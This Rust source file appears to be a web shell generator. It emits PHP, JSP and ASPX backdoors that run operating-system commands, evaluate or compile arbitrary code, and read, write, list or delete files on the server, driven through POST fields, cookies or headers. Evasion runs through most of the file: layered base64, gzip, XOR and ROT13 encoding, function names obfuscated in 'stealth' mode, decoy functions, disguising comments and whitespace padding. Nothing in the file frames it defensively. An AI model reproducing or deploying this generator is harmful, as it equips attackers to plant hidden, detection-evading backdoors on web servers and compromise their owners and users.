//! Rendu des trois familles de shells. Toute la variété syntaxique passe par le Rng.

use crate::rng::Rng;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Lang {
    Php,
    Jsp,
    Aspx,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    Simple,
    Advanced,
    Stealth,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Action {
    Exec,
    Eval,
    File,
    All,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Transport {
    Post,
    Cookie,
    Header,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Cipher {
    None,
    B64,
    Gzinflate,
    Xor,
    Rot13,
    Layered,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Auth {
    None,
    Plain,
    Md5,
    Sha1,
}

impl Action {
    pub fn exec(self) -> bool {
        matches!(self, Action::Exec | Action::All)
    }
    pub fn eval(self) -> bool {
        matches!(self, Action::Eval | Action::All)
    }
    pub fn file(self) -> bool {
        matches!(self, Action::File | Action::All)
    }
}

pub struct Spec {
    pub lang: Lang,
    pub mode: Mode,
    pub action: Action,
    pub transport: Transport,
    pub cipher: Cipher,
    pub auth: Auth,
    pub param: String,
    pub auth_param: String,
    /// Valeur effectivement embarquée : hash si auth est hashée, secret si plain.
    pub secret: String,
    pub key: String,
    pub pad: bool,
    pub decoy: bool,
    pub minify: bool,
    pub comments: bool,
    pub seed: u64,
}

fn uid(r: &mut Rng, taken: &mut Vec<String>) -> String {
    loop {
        let len = 1 + r.below(2);
        let mut s = String::new();
        for _ in 0..len {
            s.push((b'a' + r.below(26) as u8) as char);
        }
        if !taken.contains(&s) {
            taken.push(s.clone());
            return s;
        }
    }
}

fn chars_of(s: &str) -> String {
    s.bytes()
        .map(|b| b.to_string())
        .collect::<Vec<_>>()
        .join(",")
}

fn esc_sq(s: &str) -> String {
    s.replace('\\', "\\\\").replace('\'', "\\'")
}

fn esc_dq(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

const NOTES: &[&str] = &[
    "front controller",
    "session bridge",
    "asset pipeline",
    "locale bootstrap",
    "cache warmup",
    "router shim",
];

fn note(r: &mut Rng) -> String {
    format!("{} {}", r.pick(NOTES), r.hex(6))
}

fn pad_block(r: &mut Rng, out: &mut String) {
    for _ in 0..r.below(3) {
        out.push('\n');
    }
}

// ---------------------------------------------------------------- PHP

fn xor_php(pv: &str, key: &str) -> String {
    format!(
        "$kz='{}';$nz=strlen(${pv});${pv}=${pv}^substr(str_repeat($kz,$nz),0,$nz);\n",
        esc_sq(key)
    )
}

fn cipher_php(c: Cipher, pv: &str, key: &str) -> String {
    let x = format!("${}", pv);
    match c {
        Cipher::None => String::new(),
        Cipher::B64 => format!("{}=@base64_decode({});\n", x, x),
        Cipher::Gzinflate => format!("{}=@gzinflate(@base64_decode({}));\n", x, x),
        Cipher::Rot13 => format!("{}=@str_rot13({});\n", x, x),
        Cipher::Xor => xor_php(pv, key),
        Cipher::Layered => {
            let mut s = format!("{}=@str_rot13({});\n", x, x);
            s.push_str(&xor_php(pv, key));
            s.push_str(&format!("{}=@gzinflate(@base64_decode({}));\n", x, x));
            s
        }
    }
}

fn exec_php(m: Mode, cv: &str, r: &mut Rng, t: &mut Vec<String>) -> String {
    match m {
        Mode::Simple => format!("@system(${})", cv),
        Mode::Stealth => {
            let f = uid(r, t);
            let name = if r.decide(50) { "system" } else { "passthru" };
            format!(
                "${}=implode('',array_map('chr',array({})));${}(${})",
                f,
                chars_of(name),
                f,
                cv
            )
        }
        Mode::Advanced => match r.below(5) {
            0 => format!("echo '<pre>';@system(${});echo '</pre>'", cv),
            1 => format!("@passthru(${})", cv),
            2 => format!("echo @shell_exec(${})", cv),
            3 => {
                let o = uid(r, t);
                format!("@exec(${},${});echo @implode(\"\\n\",${})", cv, o, o)
            }
            _ => {
                let h = uid(r, t);
                format!(
                    "${}=@popen(${},'r');while(!@feof(${}))echo @fread(${},4096);@pclose(${})",
                    h, cv, h, h, h
                )
            }
        },
    }
}

fn file_php(cv: &str, r: &mut Rng, t: &mut Vec<String>) -> String {
    let a = uid(r, t);
    let mut s = format!(
        "case 'f':${}=explode('|',${},3);switch(${}[0]){{\n",
        a, cv, a
    );
    s.push_str(&format!(
        "case 'r':echo @file_get_contents(${}[1]);break;\n",
        a
    ));
    s.push_str(&format!(
        "case 'w':echo @file_put_contents(${}[1],@base64_decode(${}[2]));break;\n",
        a, a
    ));
    s.push_str(&format!(
        "case 'l':echo @implode(\"\\n\",@scandir(${}[1]));break;\n",
        a
    ));
    s.push_str(&format!(
        "case 'd':echo @unlink(${}[1])?'1':'0';break;\n",
        a
    ));
    s.push_str("}break;\n");
    s
}

fn decoy_php(r: &mut Rng, t: &mut Vec<String>) -> String {
    let mut s = String::new();
    for _ in 0..(1 + r.below(2)) {
        let f = uid(r, t);
        let a = uid(r, t);
        let b = uid(r, t);
        match r.below(3) {
            0 => s.push_str(&format!(
                "function {}({}){{return strrev(str_rot13(${}));}}\n",
                f, a, a
            )),
            1 => s.push_str(&format!(
                "function {}({},${}){{return array_map(${},${});}}\n",
                f, a, b, a, b
            )),
            _ => s.push_str(&format!(
                "function {}({},${}){{return substr(str_repeat(${},2),0,max(0,${}));}}\n",
                f, a, b, a, b
            )),
        }
    }
    s
}

pub fn php(s: &Spec, r: &mut Rng) -> String {
    let mut t = vec!["kz".to_string(), "nz".to_string()];
    let rq = uid(r, &mut t);
    let pv = uid(r, &mut t);
    let md = uid(r, &mut t);
    let cv = uid(r, &mut t);

    let hdr = s.transport == Transport::Header;
    let par = if hdr {
        s.param.to_lowercase()
    } else {
        s.param.clone()
    };
    let ap = if hdr {
        s.auth_param.to_lowercase()
    } else {
        s.auth_param.clone()
    };
    let stealth = s.mode == Mode::Stealth;

    let mut o = String::new();
    if s.comments {
        o.push_str(&format!("<?php /* {} */\n", note(r)));
    } else {
        o.push_str("<?php\n");
    }

    if s.mode != Mode::Simple {
        o.push_str("@ini_set('display_errors','0');@error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);\n");
        pad_block(r, &mut o);
    }

    if s.decoy {
        o.push_str(&decoy_php(r, &mut t));
        pad_block(r, &mut o);
    }

    match s.transport {
        Transport::Post if stealth => o.push_str(&format!("${}=$GLOBALS['_P'.'OST'];\n", rq)),
        Transport::Post => o.push_str(&format!("${}=$_POST;\n", rq)),
        Transport::Cookie if stealth => o.push_str(&format!("${}=$GLOBALS['_C'.'OOKIE'];\n", rq)),
        Transport::Cookie => o.push_str(&format!("${}=$_COOKIE;\n", rq)),
        Transport::Header => {
            let a = uid(r, &mut t);
            let b = uid(r, &mut t);
            o.push_str(&format!(
                "${}=array();foreach((array)@getallheaders() as ${}=>${})${}[strtolower(${})]=${};\n",
                rq, a, b, rq, a, b
            ));
        }
    }

    match s.auth {
        Auth::None => {}
        Auth::Plain => o.push_str(&format!(
            "if((${}['{}']??'')!=='{}')exit;\n",
            rq,
            ap,
            esc_sq(&s.secret)
        )),
        Auth::Md5 if stealth => o.push_str(&format!(
            "if(@hash('md5',${}['{}']??'')!=='{}')exit;\n",
            rq, ap, s.secret
        )),
        Auth::Md5 => o.push_str(&format!(
            "if(@md5(${}['{}']??'')!=='{}')exit;\n",
            rq, ap, s.secret
        )),
        Auth::Sha1 if stealth => o.push_str(&format!(
            "if(@hash('sha1',${}['{}']??'')!=='{}')exit;\n",
            rq, ap, s.secret
        )),
        Auth::Sha1 => o.push_str(&format!(
            "if(@sha1(${}['{}']??'')!=='{}')exit;\n",
            rq, ap, s.secret
        )),
    }

    o.push_str(&format!("${}=${}['{}']??'';\n", pv, rq, par));
    o.push_str(&format!("if(!${})exit;\n", pv));
    o.push_str(&cipher_php(s.cipher, &pv, &s.key));

    let mut cases = String::new();
    if s.action.exec() {
        cases.push_str(&format!(
            "case 'e':{};break;\n",
            exec_php(s.mode, &cv, r, &mut t)
        ));
    }
    if s.action.eval() {
        cases.push_str(&format!("case 'x':@eval(${});break;\n", cv));
    }
    if s.action.file() {
        cases.push_str(&file_php(&cv, r, &mut t));
    }

    o.push_str(&format!(
        "list(${},${})=explode(':',${},2);\nswitch(${}){{\n{}}}\n",
        md, cv, pv, md, cases
    ));

    o
}

// ---------------------------------------------------------------- JSP

fn jsp_auth(s: &Spec) -> String {
    let p = &s.auth_param;
    match s.auth {
        Auth::None => String::new(),
        Auth::Plain => format!(
            "if(!\"{}\".equals(request.getParameter(\"{}\")))return;\n",
            esc_dq(&s.secret),
            p
        ),
        Auth::Md5 => format!(
            "String kk=request.getParameter(\"{}\");if(kk==null||!h5(kk).equals(\"{}\"))return;\n",
            p, s.secret
        ),
        Auth::Sha1 => format!(
            "String kk=request.getParameter(\"{}\");if(kk==null||!h1(kk).equals(\"{}\"))return;\n",
            p, s.secret
        ),
    }
}

fn jsp_get(s: &Spec, pv: &str) -> String {
    let p = if s.transport == Transport::Header {
        s.param.to_lowercase()
    } else {
        s.param.clone()
    };
    match s.transport {
        Transport::Post => format!("String {}=request.getParameter(\"{}\");\n", pv, p),
        Transport::Header => format!("String {}=request.getHeader(\"{}\");\n", pv, p),
        Transport::Cookie => format!(
            "String {}=null;if(request.getCookies()!=null)for(Cookie cc:request.getCookies())if(cc.getName().equals(\"{}\")){}=cc.getValue();\n",
            pv, p, pv
        ),
    }
}

fn jsp_cipher(c: Cipher, pv: &str, key: &str) -> String {
    match c {
        Cipher::None => String::new(),
        Cipher::B64 => format!(
            "{}=new String(Base64.getDecoder().decode({}),\"UTF-8\");\n",
            pv, pv
        ),
        Cipher::Gzinflate => format!("{}=gu(Base64.getDecoder().decode({}));\n", pv, pv),
        Cipher::Rot13 => format!("{}=r3({});\n", pv, pv),
        Cipher::Xor => format!("{}=xr({},\"{}\");\n", pv, pv, esc_dq(key)),
        Cipher::Layered => format!(
            "{}=gu(Base64.getDecoder().decode(xr(r3({}),\"{}\")));\n",
            pv,
            pv,
            esc_dq(key)
        ),
    }
}

fn jsp_helpers(s: &Spec) -> String {
    let mut d = String::new();
    if matches!(s.cipher, Cipher::Gzinflate | Cipher::Layered) {
        d.push_str("static String gu(byte[] b)throws Exception{java.util.zip.InflaterInputStream i=new java.util.zip.InflaterInputStream(new ByteArrayInputStream(b));ByteArrayOutputStream o=new ByteArrayOutputStream();byte[] f=new byte[4096];int n;while((n=i.read(f))>0)o.write(f,0,n);return new String(o.toByteArray(),\"UTF-8\");}\n");
    }
    if matches!(s.cipher, Cipher::Xor | Cipher::Layered) {
        d.push_str("static String xr(String s,String k){StringBuilder b=new StringBuilder();for(int i=0;i<s.length();i++)b.append((char)(s.charAt(i)^k.charAt(i%k.length())));return b.toString();}\n");
    }
    if matches!(s.cipher, Cipher::Rot13 | Cipher::Layered) {
        d.push_str("static String r3(String s){StringBuilder b=new StringBuilder();for(char c:s.toCharArray()){if(c>='a'&&c<='z')c=(char)((c-'a'+13)%26+'a');else if(c>='A'&&c<='Z')c=(char)((c-'A'+13)%26+'A');b.append(c);}return b.toString();}\n");
    }
    if matches!(s.auth, Auth::Md5 | Auth::Sha1) {
        d.push_str("static String hx(String s,String a){try{byte[] x=MessageDigest.getInstance(a).digest(s.getBytes(\"UTF-8\"));StringBuilder b=new StringBuilder();for(byte y:x)b.append(String.format(\"%02x\",y));return b.toString();}catch(Exception e){return \"\";}}\n");
    }
    if matches!(s.auth, Auth::Md5) {
        d.push_str("static String h5(String s){return hx(s,\"MD5\");}\n");
    }
    if matches!(s.auth, Auth::Sha1) {
        d.push_str("static String h1(String s){return hx(s,\"SHA-1\");}\n");
    }
    if s.action.exec() {
        d.push_str("static String sh(String c)throws Exception{String[] a=new String[]{\"/bin/sh\",\"-c\",c};Class<?> r=Class.forName(\"java.lang.Runtime\");Object o=r.getMethod(\"getRuntime\").invoke(null);Process p=(Process)r.getMethod(\"exec\",String[].class).invoke(o,(Object)a);ByteArrayOutputStream b=new ByteArrayOutputStream();InputStream i=p.getInputStream();byte[] f=new byte[4096];int n;while((n=i.read(f))>0)b.write(f,0,n);return new String(b.toByteArray(),\"UTF-8\");}\n");
    }
    if s.action.file() {
        d.push_str("static String fo(String c)throws Exception{String[] a=c.split(\"\\\\|\",3);if(a[0].equals(\"r\"))return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(a[1])),\"UTF-8\");if(a[0].equals(\"w\")){java.nio.file.Files.write(java.nio.file.Paths.get(a[1]),Base64.getDecoder().decode(a[2]));return \"1\";}if(a[0].equals(\"l\")){StringBuilder b=new StringBuilder();File[] l=new File(a[1]).listFiles();if(l!=null)for(File f:l)b.append(f.getName()).append(\"\\n\");return b.toString();}if(a[0].equals(\"d\"))return new File(a[1]).delete()?\"1\":\"0\";return \"\";}\n");
    }
    if s.action.eval() {
        d.push_str("static String ev(String src)throws Exception{javax.tools.JavaCompiler jc=javax.tools.ToolProvider.getSystemJavaCompiler();if(jc==null)return \"no compiler\";File d=File.createTempFile(\"kx\",\".d\");d.delete();d.mkdirs();File f=new File(d,\"K.java\");FileWriter w=new FileWriter(f);w.write(src);w.close();jc.run(null,null,null,\"-d\",d.getPath(),f.getPath());java.net.URLClassLoader u=new java.net.URLClassLoader(new java.net.URL[]{d.toURI().toURL()});Class<?> k=u.loadClass(\"K\");return String.valueOf(k.getMethod(\"run\").invoke(null));}\n");
    }
    d
}

pub fn jsp(s: &Spec, r: &mut Rng) -> String {
    let pv = "pv";
    let mut o = String::new();

    if s.comments {
        o.push_str("<%@ page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\" %><%@ page import=\"java.io.*,java.util.*,java.lang.reflect.*,java.security.*\" %>\n");
        o.push_str(&format!("<%-- {} --%>\n", note(r)));
    } else {
        o.push_str("<%@ page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\" %><%@ page import=\"java.io.*,java.util.*,java.lang.reflect.*,java.security.*\" %>\n");
    }

    o.push_str("<%!\n");
    o.push_str(&jsp_helpers(s));
    o.push_str("%>\n");

    if s.decoy {
        o.push_str("<%!\nstatic String dc(String a){return new StringBuilder(a).reverse().toString();}\n%>\n");
    }

    o.push_str("<%\ntry{\n");
    o.push_str(&jsp_auth(s));
    o.push_str(&jsp_get(s, pv));
    o.push_str(&format!("if({}==null)return;\n", pv));
    o.push_str(&jsp_cipher(s.cipher, pv, &s.key));
    o.push_str(&format!(
        "int ix={}.indexOf(':');String md=ix<0?{}:{}.substring(0,ix);String cv=ix<0?\"\":{}.substring(ix+1);\n",
        pv, pv, pv, pv
    ));

    if s.action.exec() {
        o.push_str("if(md.equals(\"e\"))out.print(sh(cv));\n");
    }
    if s.action.eval() {
        o.push_str("else if(md.equals(\"x\"))out.print(ev(cv));\n");
    }
    if s.action.file() {
        o.push_str("else if(md.equals(\"f\"))out.print(fo(cv));\n");
    }
    o.push_str("}catch(Exception e){out.print(e.toString());}\n%>\n");
    o
}

// ---------------------------------------------------------------- ASPX

fn aspx_auth(s: &Spec) -> String {
    let p = &s.auth_param;
    match s.auth {
        Auth::None => String::new(),
        Auth::Plain => format!("if(Req(\"{}\")!=\"{}\")return;\n", p, esc_dq(&s.secret)),
        Auth::Md5 => format!("if(h5(Req(\"{}\"))!=\"{}\")return;\n", p, s.secret),
        Auth::Sha1 => format!("if(h1(Req(\"{}\"))!=\"{}\")return;\n", p, s.secret),
    }
}

fn aspx_helpers(s: &Spec) -> String {
    let mut d = String::new();
    d.push_str("static string Req(string n){return Request.Headers[n]??Request.Params[n]??(Request.Cookies[n]!=null?Request.Cookies[n].Value:\"\")??\"\";}\n");
    if matches!(s.cipher, Cipher::Gzinflate | Cipher::Layered) {
        d.push_str("static string gu(byte[] b){var i=new System.IO.Compression.DeflateStream(new MemoryStream(b),System.IO.Compression.CompressionMode.Decompress);var o=new MemoryStream();byte[] f=new byte[4096];int n;while((n=i.Read(f,0,f.Length))>0)o.Write(f,0,n);return Encoding.UTF8.GetString(o.ToArray());}\n");
    }
    if matches!(s.cipher, Cipher::Xor | Cipher::Layered) {
        d.push_str("static string xr(string s,string k){var b=new StringBuilder();for(int i=0;i<s.Length;i++)b.Append((char)(s[i]^k[i%k.Length]));return b.ToString();}\n");
    }
    if matches!(s.cipher, Cipher::Rot13 | Cipher::Layered) {
        d.push_str("static string r3(string s){var b=new StringBuilder();foreach(char c in s){char x=c;if(x>='a'&&x<='z')x=(char)((x-'a'+13)%26+'a');else if(x>='A'&&x<='Z')x=(char)((x-'A'+13)%26+'A');b.Append(x);}return b.ToString();}\n");
    }
    if matches!(s.auth, Auth::Md5 | Auth::Sha1) {
        d.push_str("static string hx(string s,string a){var m=System.Security.Cryptography.HashAlgorithm.Create(a);var x=m.ComputeHash(Encoding.UTF8.GetBytes(s));var b=new StringBuilder();foreach(byte y in x)b.Append(y.ToString(\"x2\"));return b.ToString();}\n");
    }
    if matches!(s.auth, Auth::Md5) {
        d.push_str("static string h5(string s){return hx(s,\"MD5\");}\n");
    }
    if matches!(s.auth, Auth::Sha1) {
        d.push_str("static string h1(string s){return hx(s,\"SHA1\");}\n");
    }
    if s.action.exec() {
        d.push_str("static string sh(string c){var i=new ProcessStartInfo(\"cmd.exe\",\"/c \"+c);i.RedirectStandardOutput=true;i.UseShellExecute=false;using(var p=Process.Start(i))return p.StandardOutput.ReadToEnd();}\n");
    }
    if s.action.file() {
        d.push_str("static string fo(string c){var a=c.Split(new char[]{'|'},3);if(a[0]==\"r\")return File.ReadAllText(a[1]);if(a[0]==\"w\"){File.WriteAllBytes(a[1],Convert.FromBase64String(a[2]));return \"1\";}if(a[0]==\"l\"){var b=new StringBuilder();foreach(var f in Directory.GetFileSystemEntries(a[1]))b.Append(f).Append(\"\\n\");return b.ToString();}if(a[0]==\"d\"){File.Delete(a[1]);return \"1\";}return \"\";}\n");
    }
    if s.action.eval() {
        d.push_str("static string ev(string src){var cp=new Microsoft.CSharp.CSharpCodeProvider();var ps=new System.CodeDom.Compiler.CompilerParameters();ps.GenerateInMemory=true;ps.ReferencedAssemblies.Add(\"System.dll\");ps.ReferencedAssemblies.Add(\"System.Core.dll\");var cr=cp.CompileAssemblyFromSource(ps,src);if(cr.Errors.HasErrors)return cr.Errors[0].ToString();var t=cr.CompiledAssembly.GetType(\"K\");return string.Concat(t.GetMethod(\"Run\").Invoke(null,null));}\n");
    }
    d
}

fn aspx_cipher(c: Cipher, pv: &str, key: &str) -> String {
    match c {
        Cipher::None => String::new(),
        Cipher::B64 => format!(
            "{}=Encoding.UTF8.GetString(Convert.FromBase64String({}));\n",
            pv, pv
        ),
        Cipher::Gzinflate => format!("{}=gu(Convert.FromBase64String({}));\n", pv, pv),
        Cipher::Rot13 => format!("{}=r3({});\n", pv, pv),
        Cipher::Xor => format!("{}=xr({},\"{}\");\n", pv, pv, esc_dq(key)),
        Cipher::Layered => format!(
            "{}=gu(Convert.FromBase64String(xr(r3({}),\"{}\")));\n",
            pv,
            pv,
            esc_dq(key)
        ),
    }
}

pub fn aspx(s: &Spec, r: &mut Rng) -> String {
    let mut o = String::new();
    o.push_str(
        "<%@ Page Language=\"C#\" ValidateRequest=\"false\" EnableViewStateMac=\"false\" %>\n",
    );
    o.push_str("<%@ Import Namespace=\"System\" %><%@ Import Namespace=\"System.IO\" %><%@ Import Namespace=\"System.Text\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.Reflection\" %>\n");
    if s.action.eval() {
        o.push_str("<%@ Import Namespace=\"System.CodeDom.Compiler\" %><%@ Import Namespace=\"Microsoft.CSharp\" %>\n");
    }
    if s.comments {
        o.push_str(&format!("<%-- {} --%>\n", note(r)));
    }

    o.push_str("<script runat=\"server\">\n");
    o.push_str(&aspx_helpers(s));
    if s.decoy {
        o.push_str("static string dc(string a){var b=a.ToCharArray();Array.Reverse(b);return new string(b);}\n");
    }
    o.push_str("void Page_Load(object s,EventArgs e){\ntry{\n");
    o.push_str(&aspx_auth(s));
    o.push_str("string pv=Req(\"");
    o.push_str(&s.param.to_lowercase());
    o.push_str("\");\nif(pv==\"\")return;\n");
    o.push_str(&aspx_cipher(s.cipher, "pv", &s.key));
    o.push_str("int ix=pv.IndexOf(':');string md=ix<0?pv:pv.Substring(0,ix);string cv=ix<0?\"\":pv.Substring(ix+1);\n");

    if s.action.exec() {
        o.push_str("if(md==\"e\")Response.Write(sh(cv));\n");
    }
    if s.action.eval() {
        o.push_str("else if(md==\"x\")Response.Write(ev(cv));\n");
    }
    if s.action.file() {
        o.push_str("else if(md==\"f\")Response.Write(fo(cv));\n");
    }
    o.push_str("}catch(Exception ex){Response.Write(ex.Message);}}\n");
    o.push_str("</script>\n");
    o
}

pub fn build(s: &Spec, r: &mut Rng) -> String {
    match s.lang {
        Lang::Php => php(s, r),
        Lang::Jsp => jsp(s, r),
        Lang::Aspx => aspx(s, r),
    }
}

pub fn minify(lang: Lang, code: &str) -> String {
    let kept: Vec<&str> = code
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("//") && !l.starts_with('#'))
        .collect();
    if kept.is_empty() {
        return String::new();
    }
    match lang {
        Lang::Php => {
            let mut out = String::from(kept[0]);
            out.push('\n');
            for l in &kept[1..] {
                out.push_str(l);
            }
            out.push('\n');
            out
        }
        _ => format!("{}\n", kept.join(" ")),
    }
}

pub fn pad(code: &str, r: &mut Rng) -> String {
    let mut out = String::new();
    for line in code.lines() {
        out.push_str(line);
        out.push('\n');
        if r.decide(18) {
            for _ in 0..(1 + r.below(2)) {
                out.push('\n');
            }
        }
        if r.decide(10) {
            out.push_str(&" ".repeat(1 + r.below(3)));
            out.push('\n');
        }
    }
    out
}
